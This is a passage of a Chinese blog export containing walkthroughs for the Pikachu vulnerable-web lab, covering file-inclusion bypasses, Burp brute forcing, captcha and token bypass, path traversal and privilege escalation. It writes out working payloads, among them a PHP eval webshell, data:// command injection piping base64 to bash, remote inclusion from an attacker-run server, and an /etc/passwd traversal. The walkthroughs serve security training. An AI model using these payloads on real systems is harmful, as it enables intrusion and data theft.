<h3 id="绕过“flag”"><a href="#绕过“flag”" class="headerlink" title="绕过“flag”"></a>绕过“flag”</h3><h5 id="1-可以通过cat-f-读取当前目录所有f开头的文件"><a href="#1-可以通过cat-f-读取当前目录所有f开头的文件" class="headerlink" title="1.可以通过cat f*读取当前目录所有f开头的文件"></a>1.可以通过cat f*读取当前目录所有f开头的文件</h5><p><img src="/images%5C1665988872945-496b2ace-1bd1-4fce-ad7f-8da9e42d1e28.png" alt="img"></p>
<h5 id="2-base64绕过"><a href="#2-base64绕过" class="headerlink" title="2.base64绕过"></a>2.base64绕过</h5><p><img src="/images%5C1665989231978-3ba62296-6db8-447f-bf9e-cce19cb8b604.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;Y2F0IGZsYWdfc2RoYWxzZC5waHA=&#x27;|base64 -d|bash</span><br><span class="line">http://218.94.126.122:31003/index.php?file=data://text/plain,&lt;?php system(&quot;echo &#x27;Y2F0IGZsYWdfc2RoYWxzZC5waHA=&#x27;|base64 -d|bash&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="3-反斜杠绕过"><a href="#3-反斜杠绕过" class="headerlink" title="3.反斜杠绕过"></a>3.反斜杠绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&quot;cat fl\ag_sdhalsd.php&quot;);?&gt;</span><br><span class="line">http://218.94.126.122:31003/index.php?file=data://text/plain,&lt;?php system(&quot;cat fl\ag_sdhalsd.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="4-1，-2和-绕过"><a href="#4-1，-2和-绕过" class="headerlink" title="4.$1，$2和$@绕过"></a>4.$1，$2和$@绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat fl$1ag_sdhalsd.php</span><br><span class="line">http://218.94.126.122:31003/index.php?file=data://text/plain,&lt;?php system(&quot;cat fl$1ag_sdhalsd.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<h1 id="本地文件包含-2"><a href="#本地文件包含-2" class="headerlink" title="本地文件包含"></a>本地文件包含</h1><p>本地文件包含，顾名思义就是包含本地的文件</p>
<p>可以写一个测试代码(该测试代码也可远程文件包含)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">include $file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=test.txt</a></p>
<p><img src="/images%5Cimage-20230110103343335.png" alt="image-20230110103343335"></p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><img src="/images%5Cimage-20230110103439657.png" alt="image-20230110103439657"></p>
<p>可以看到传参为filename读取本地文件</p>
<p>更改为file2.php</p>
<p><img src="/images%5Cimage-20230110103559613.png" alt="image-20230110103559613"></p>
<p>如果此时能够通过文件上传或其他方式写入一个webshell，就可以通过本地文件包含访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>

<p>url为(不一定为php文件，txt里面放个木马也行)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/fileinclude/fi_local.php?filename=../../../../shell.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110104124430.png" alt="image-20230110104124430"></p>
<h1 id="远程文件包含-2"><a href="#远程文件包含-2" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><p>远程文件包含，顾名思义，可以包含远程文件，如果源代码使用的是include,，那么包含的文件都会被显示出来，不一定是php</p>
<p>可以写一个测试代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">include $file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=http://www.baidu.com">http://127.0.0.1:88/DX/file_include/index.php?file=http://www.baidu.com</a></p>
<p><img src="/images%5Cimage-20230110104347093.png" alt="image-20230110104347093"></p>
<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p>可以在自己的服务器上放一个木马，远程文件包含利用</p>
<p><img src="/images%5Cimage-20230110104804316.png" alt="image-20230110104804316"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//其一个http服务供访问，监听22222端口</span><br><span class="line"></span><br><span class="line">python3 -m http.server 22222</span><br></pre></td></tr></table></figure>

<h5 id="远程文件包含-3"><a href="#远程文件包含-3" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><p>url为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/file_include/index.php?file=http://x.x.x.x:22222/test.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110104922768.png" alt="image-20230110104922768"></p>
<h3 id="伪协议利用"><a href="#伪协议利用" class="headerlink" title="伪协议利用"></a>伪协议利用</h3><p>使用data:text&#x2F;plain,伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data:text/plain,&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>

<p>url为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:88/DX/file_include/index.php?file=data:text/plain,&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110105123160.png" alt="image-20230110105123160"></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-暴力破解</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="暴力破解概述"><a href="#暴力破解概述" class="headerlink" title="暴力破解概述"></a>暴力破解概述</h1><p>当登录口未设置强安全机制，并且使用弱用户名弱口令，便存在被爆破成功风险。</p>
<p>下述所有操作都以最新版的burp为例。</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>火狐浏览器安装foxproxy插件，用于设置代理转发</p>
<p><img src="/images%5C1660098471419-484afa6c-e238-44c3-bfb8-4b5b49c995ab.png" alt="img"></p>
<p>chrome可安装proxy switchomega插件</p>
<p><img src="/images%5C1660098708129-16ad2303-db87-459a-b8de-c65341cc0118.png" alt="img"></p>
<p>根据burp中的设置配置代理</p>
<p><img src="/images%5C1660098560458-6473cdb4-d4fb-4238-9154-4ab84d2f45e7.png" alt="img"></p>
<p>foxproxy配置</p>
<p><img src="/images%5C1660098604468-f69aa556-a378-4301-a063-8b225a30dedd.png" alt="img"></p>
<h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><h3 id="火狐浏览器抓包问题"><a href="#火狐浏览器抓包问题" class="headerlink" title="火狐浏览器抓包问题"></a>火狐浏览器抓包问题</h3><p>火狐浏览器刚配置完代理抓包可能会抓到许多firefox的数据包</p>
<p><img src="/images%5C1660099283211-9e201c63-214b-477b-81a0-58f5784d036b.png" alt="img"></p>
<p>在浏览器中地址栏输入about:config</p>
<p>搜索</p>
<p>network.captive-portal-service</p>
<p>将下图标识处改为false即可</p>
<p><img src="/images%5C1660099437014-de6052d6-9592-41d5-9bc6-709c52c040ad.png" alt="img"></p>
<h3 id="burp抓不到https数据包问题"><a href="#burp抓不到https数据包问题" class="headerlink" title="burp抓不到https数据包问题"></a>burp抓不到https数据包问题</h3><p>由于https属于安全传输协议，需要证书支持，在未给浏览器安装burp证书时，就会出现抓不到https数据包或出现如下界面。</p>
<p><img src="/images%5C1660099664443-b5f63d68-8419-4752-b8bd-425c12c8a159.png" alt="img"></p>
<p>解决方式</p>
<p><a href="https://www.yuque.com/docs/share/7d445725-3de8-431e-a37a-e03a1c8be8c6#">https://www.yuque.com/docs/share/7d445725-3de8-431e-a37a-e03a1c8be8c6?#</a> 《浏览器安装burp证书》</p>
<h1 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h1><p><img src="/images%5C1660100279409-0c3ba2a9-b2ea-43b2-b179-7ecd3f3bf60c.png" alt="img"></p>
<p>基于表单的暴力破解没有验证码机制和任何加密</p>
<p>配置代理直接抓包，可以看出账号密码为明文传输，右键发送intruder(爆破模块)</p>
<p><img src="/images%5C1660100460785-64778103-9fc5-4d9b-ab19-924ebbd77610.png" alt="img"></p>
<p>定位需要爆破的位置，选择第四种模式</p>
<p><img src="/images%5C1660100704305-906eedf8-4621-4132-85f8-0ae8b89e80b9.png" alt="img"></p>
<p>对于四种爆破模式，可以参考</p>
<p><a href="https://www.yuque.com/docs/share/506932ce-6561-4d4e-9494-95f3110ca7a9#">https://www.yuque.com/docs/share/506932ce-6561-4d4e-9494-95f3110ca7a9?#</a> 《burp intruder(爆破模块)四种模式》</p>
<p>指定position1的payload</p>
<p><img src="/images%5C1660111324413-258f3706-b3a0-4ad3-9896-0afe221e8ef3.png" alt="img">指定position2的payload</p>
<p><img src="/images%5C1660111364947-6d48526f-52fa-4e26-852a-11db8fefc36b.png" alt="img"></p>
<p>爆破成功</p>
<p><img src="/images%5C1660111405873-48fbd8a0-9e83-4dfb-8d82-bc26ca889f3a.png" alt="img"></p>
<h1 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h1><p>开启抓包，可以发现在刷新验证码时并没有捕获到发送到服务端的请求包</p>
<p>可以判断出这是在客户端上对用户输入的验证码进行判断，所以可以通过更改前端代码进行绕过。</p>
<p>直接f12</p>
<p>定位到验证码，直接删除class字段<img src="/images%5C1660113946019-2c20cab8-4bb1-44be-b401-f03a0bb159b5.png" alt="img"></p>
<p>class 属性大多数时候用于指向样式表中的类（class）。不过，也可以利用它通过 JavaScript 来改变带有指定 class 的 HTML 元素。</p>
<p>即class可以指定标签所对应的js代码，这里vcode指定的行为就是验证码的js函数<img src="/images%5C1660114519473-d821c73a-7390-4c44-bab8-246fb5f8503a.png" alt="img"></p>
<p>同上述一样，直接抓包爆破<img src="/images%5C1660114753302-5ec62fb5-da0b-4fb3-8584-ca296fe80958.png" alt="img"></p>
<h1 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h1><p>服务端可以通过对验证码进行验证从而防止弱口令被爆破，但由于验证码的时效性会导致验证码可以长时间有效，造成仍然可爆破的风险。</p>
<p>同样首先抓包，存在验证码</p>
<p>扔到重发器里</p>
<p><img src="/images%5C1660112138355-43cb2e50-3fd0-49ce-af91-edc070a59d22.png" alt="img"></p>
<p>注意，这里不要forward放包，卡住就好了</p>
<p>在repeater模块中，疯狂点send，可以发现响应包并无提示验证码失效等信息，即验证码存在长有效期。</p>
<p><img src="/images%5C1660112258142-e77c2e79-8df3-48b6-b6e8-902446b2c952.png" alt="img"></p>
<p>右键send intruder爆破模块</p>
<p><img src="/images%5C1660112412387-aeb0fec0-433b-45c4-8923-0cd87c668bd1.png" alt="img"></p>
<p><img src="/images%5C1660112771243-b18e8507-52be-4510-8df1-68375205d903.png" alt="img"></p>
<p>然后之后的步骤就和前一题的步骤相同了，注意就是不要放包，或把浏览器代理关了再放包。</p>
<p>主要是为了拦截浏览器对验证码的新的请求，如下，防止验证码刷新。</p>
<p><img src="/images%5C1660113038650-edf5fa42-247c-49d9-aef6-54d33e5a9692.png" alt="img"></p>
<h1 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h1><p>token是服务端返回的一个字符串，用于验证客户端的请求。</p>
<p>需要配合正确的token才可以登录，用户名密码错误就会显示csrf token error</p>
<p><img src="/images%5C1660115122309-ec98021e-3434-481a-860b-846179afe5c4.png" alt="img"></p>
<p>首先抓个包看看</p>
<p>请求包</p>
<p><img src="/images%5C1660146068145-e3f17cad-8879-49bd-b9fb-b1a68dafe554.png" alt="img"></p>
<p>返回包，其中存在一个token的value值</p>
<p><img src="/images%5C1660145953993-38c92455-684f-4736-a036-deab6f219f1f.png" alt="img"></p>
<p>放包后，输入账号密码进行抓包，发现还携带了一个token字段，正是之前刷新页面所返回的token值</p>
<p><img src="/images%5C1660145945546-10033395-12ae-490c-80a9-a290c8fd9cf6.png" alt="img"></p>
<p>这里利用爆破模块重发几个数据包看看</p>
<p><img src="/images%5C1660146502450-23fddd58-c9ae-4d89-b891-9442b088862e.png" alt="img"></p>
<p>可以发现，每个请求包过后，token的value都会变化</p>
<p>想要爆破就必须对每一次token值进行填充</p>
<p>而我们知道，token是刷新页面后得到的，并且可以在网页源代码中得到</p>
<p>所以想要爆破弱口令，首先就需要将每一次新的token取出进行填充</p>
<p>为了演示方便，只添加passwd和token俩个position进行爆破</p>
<p>并且，这里由于发一次包token就失效了，所以需要采用爆破的第三种模式</p>
<p><img src="/images%5C1660147708137-e1d2ce4c-d5d7-4473-b841-c700bb9adac3.png" alt="img"></p>
<p>在Options下的Grep-Extract中提取token（该功能可以通过正则提取返回信息中的内容）</p>
<p>点击Add添加攻击需要用到的信息(user_token)</p>
<p><img src="/images%5C1660148121857-c7abd49d-7ceb-4e45-afa6-d7cd431a1fd8.png" alt="img"></p>
<p>点击Fetch response后在返回的代码中找到token的value，并将其选中后复制(后续用到)</p>
<p><img src="/images%5C1660180268397-d39d3b95-6e08-402a-8d73-06673683e956.png" alt="img"></p>
<p>ok后会添加一条新规则</p>
<p><img src="/images%5C1660180485320-a3694f40-5d31-40f3-b301-b2cccde64dc4.png" alt="img"></p>
<p>position1密码字段还和之前一样，使用simple list就行</p>
<p><img src="/images%5C1660180576308-ee6b3639-d0ea-4000-8dab-a6d6a1a620f2.png" alt="img"></p>
<p>position2 token字段，需要使用Recursive grep，匹配刚刚选择的正则</p>
<p><img src="/images%5C1660180674260-44f202d0-47d1-44e6-a0b5-d941e4dc7187.png" alt="img"></p>
<p><img src="/images%5C1660180984675-6c273c9e-0941-4576-9474-2101d3d6f2e6.png" alt="img"></p>
<p>注意这里将刚刚复制的token的value值填充，用于爆破的第一次请求</p>
<p>这上面的操作，就是将请求后返回的响应包中的token的value值，填充到下一次请求包中的token字段。</p>
<p>这里还需要对并发数进行设置（resource pool）</p>
<p>因为每一次新的请求，都需要上一次请求返回的响应包中的token的value进行填充</p>
<p>所以需要将并发数改为1</p>
<p><img src="/images%5C1660181712957-f7b567a3-cc1f-4794-84f1-1e474f000abe.png" alt="img"></p>
<p>然后开始爆破，可以看出token值也在变化</p>
<p>成功爆破出密码</p>
<p><img src="/images%5C1660181900272-83634187-4a90-431f-8908-7c97343f2830.png" alt="img"></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-目录遍历</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<p>目录遍历，这里更像是路径穿越</p>
<p>很像本地文件包含</p>
<p>如果是linux系统，可以访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这里可以看下源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;title&#x27;]))&#123;</span><br><span class="line">    $filename=$_GET[&#x27;title&#x27;];</span><br><span class="line">    //这里直接把传进来的内容进行了require(),造成问题</span><br><span class="line">    require &quot;soup/$filename&quot;;</span><br><span class="line">//    echo $html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>require()也是用于文件包含的函数</p>
<p>和include()的区别在于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include() 出错仅是警告，脚本继续执行 </span><br><span class="line">require() 出错则爆出致命错误，脚本立刻终止 </span><br></pre></td></tr></table></figure>

<p>所以这里当作文件包含利用即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/dir/dir_list.php?title=../../../shell.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110143442285.png" alt="image-20230110143442285"></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-环境部署</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<p>linux上可使用宝塔进行部署</p>
<p>windows上使用phpstudy搭建</p>
<p>下述以windows为例</p>
<h3 id="pikachu下载链接"><a href="#pikachu下载链接" class="headerlink" title="pikachu下载链接"></a>pikachu下载链接</h3><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
<h3 id="phpstudy下载链接"><a href="#phpstudy下载链接" class="headerlink" title="phpstudy下载链接"></a>phpstudy下载链接</h3><p><a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></p>
<h3 id="开始部署"><a href="#开始部署" class="headerlink" title="开始部署"></a>开始部署</h3><h5 id="php"><a href="#php" class="headerlink" title="php"></a>php</h5><p>需要使用php 5.6版本，别搞太高了问题都不大</p>
<p><img src="/images%5C1663473977746-571a7526-a3d8-4c08-a482-ff660a526735.png" alt="img"></p>
<p>在这里面修改自己的php版本</p>
<p><img src="/images%5C1663474059051-8bc29887-7653-43e6-b42c-f8cf6b1f88a7.png" alt="img"></p>
<h5 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h5><p>数据库使用5.0版本</p>
<p><img src="/images%5C1663474111537-28b43306-3ff8-4e40-95ab-b86aea6f87fe.png" alt="img"></p>
<p><img src="/images%5C1660097657076-ec17be27-2b11-4054-a851-654fc2321f1a.png" alt="img"></p>
<h3 id="启动后新建数据库"><a href="#启动后新建数据库" class="headerlink" title="启动后新建数据库"></a>启动后新建数据库</h3><p>这里主要是配置pikachu的数据库环境</p>
<p><img src="/images%5C1663474183436-05a3186d-521e-4105-87f2-b00960ef11f5.png" alt="img"></p>
<h3 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h3><p>解压后可以自己重命名(之后访问的路径)，放到phpstudy的根目录下</p>
<p><img src="/images%5C1663475005203-02c5c0e7-5a86-4f12-a483-d98edaf3f6d4.png" alt="img"></p>
<p>找到此配置文件\pikachu\inc\config.inc.php</p>
<p>修改数据库相关信息，即上述在phpstudy中新建的pikachu数据库</p>
<p><img src="/images%5C1660097734927-34555e1f-0b21-46b1-a457-0f6ce355a83a.png" alt="img"></p>
<p><a href="http://127.0.0.1/DX/pikachu/install.php#">http://127.0.0.1/pikachu(自己命名的路径)/install.php</a></p>
<p><img src="/images%5C1660097763217-bca63c0b-9f98-4260-9dda-9819b9c8b394.png" alt="img"></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-越权</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E8%B6%8A%E6%9D%83/</url>
    <content><![CDATA[<h1 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h1><p>越权，字面意思就是越过权限，完成其他权限拥有的操作</p>
<p>又分为水平越权和垂直越权</p>
<h3 id="水平越权-1"><a href="#水平越权-1" class="headerlink" title="水平越权"></a>水平越权</h3><p>当获取某普通用户的权限，可以对其他普通用户的接口进行操作</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先根据提示随便登录一个普通权限用户</p>
<p><img src="/images%5Cimage-20230110134707004.png" alt="image-20230110134707004"></p>
<p>可以看到有一个查看个人信息的接口</p>
<p><img src="/images%5Cimage-20230110134756218.png" alt="image-20230110134756218"></p>
<p>请求url为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=提交</span><br></pre></td></tr></table></figure>

<p>当我们更改username的值为其他用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=提交</span><br></pre></td></tr></table></figure>

<p>成功获取kobe的个人信息</p>
<p><img src="/images%5Cimage-20230110134959340.png" alt="image-20230110134959340"></p>
<p>可以判断，该接口未作任何身份校验，可直接越权访问其他用户个人信息</p>
<p>(注意，还是需要一个权限才能越权，否则也无法未授权访问)</p>
<h1 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h1><p>越权，字面意思就是越过权限，完成其他权限拥有的操作</p>
<p>又分为水平越权和垂直越权</p>
<h3 id="垂直越权-1"><a href="#垂直越权-1" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>当获得普通用户权限，可以对管理员权限用户的接口进行操作</p>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>根据提示登录普通用户权限</p>
<p><img src="/images%5Cimage-20230110135343163.png" alt="image-20230110135343163"></p>
<p>可以发现普通用户只有查看权限</p>
<p><img src="/images%5Cimage-20230110135516941.png" alt="image-20230110135516941"></p>
<p>现在登录管理员权限</p>
<p>注意：这一步只是为了获取管理员的一些操作接口，在真实环境中，该接口可能通过其他方式获得，比如接口泄露(并不会获取到管理员权限)</p>
<p><img src="/images%5Cimage-20230110135702749.png" alt="image-20230110135702749"></p>
<h5 id="添加用户接口"><a href="#添加用户接口" class="headerlink" title="添加用户接口"></a>添加用户接口</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /DX/pikachu/vul/overperm ission/op2/op2_admin_edit.php</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">username=test&amp;password=111111&amp;sex=n&amp;phonenum=13888888888&amp;email=123456%40qq.com&amp;address=tianjiing&amp;submit=%E5%88%9B%E5%BB%BA</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230110135901846.png" alt="image-20230110135901846"></p>
<p>url为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure>

<p>获取接口后退出登录，再次登录普通用户权限</p>
<p>利用普通用户权限访问添加用户接口，添加一个用户</p>
<p><img src="/images%5Cimage-20230110142027589.png" alt="image-20230110142027589"></p>
<p>重新登录到pikachu用户，可以看到越权添加的用户</p>
<p><img src="/images%5Cimage-20230110142105328.png" alt="image-20230110142105328"></p>
<h5 id="删除用户接口"><a href="#删除用户接口" class="headerlink" title="删除用户接口"></a>删除用户接口</h5><p>admin用户还提供了删除用户接口</p>
<p><img src="/images%5Cimage-20230110142222943.png" alt="image-20230110142222943"></p>
<p>同样，先抓取删除用户接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/overpermission/op2/op2_admin.php?id=90</span><br></pre></td></tr></table></figure>

<p>退出登录</p>
<p>登录pikachu用户，访问删除接口测试</p>
<p>经测试，删除接口不存在越权</p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
</search>
